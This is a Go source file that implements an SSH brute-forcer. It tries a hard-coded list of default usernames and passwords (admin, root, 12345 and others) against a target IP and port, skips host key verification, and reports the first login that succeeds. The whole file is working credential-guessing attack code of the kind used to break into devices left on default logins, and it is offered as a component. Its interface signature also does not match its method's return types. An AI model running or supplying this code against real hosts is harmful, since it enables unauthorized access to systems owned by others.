package dnrt

import (
	"fmt"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

type Bruteforcer interface {
	brute(net.IP, uint16) (string, string, string)
}

func getUserList() []string {
	return []string{
		"admin",
		"root",
		"user",
		"12345",
	}
}

func getPassList() []string {
	return []string{
		"admin",
		"root",
		"password",
		"12345",
	}
}

type SSHBruteforcer struct {
	Bruteforcer
}

func NewSSHBruteforcer() SSHBruteforcer {
	return SSHBruteforcer{}
}

func (b *SSHBruteforcer) brute(ip net.IP, port uint16) (bool, string, string) {
	userList := getUserList()
	passList := getPassList()

	for _, user := range userList {
		for _, pass := range passList {
			sshConfig := &ssh.ClientConfig{
				User:            user,
				Auth:            []ssh.AuthMethod{ssh.Password(pass)},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         time.Millisecond * 150,
			}

			sshAddress := fmt.Sprintf("%s:%d", ip.String(), port)
			connection, err := ssh.Dial("tcp", sshAddress, sshConfig)
			if err == nil {
				connection.Close()
				return true, user, pass
			}
		}
	}

	return false, "", ""
}
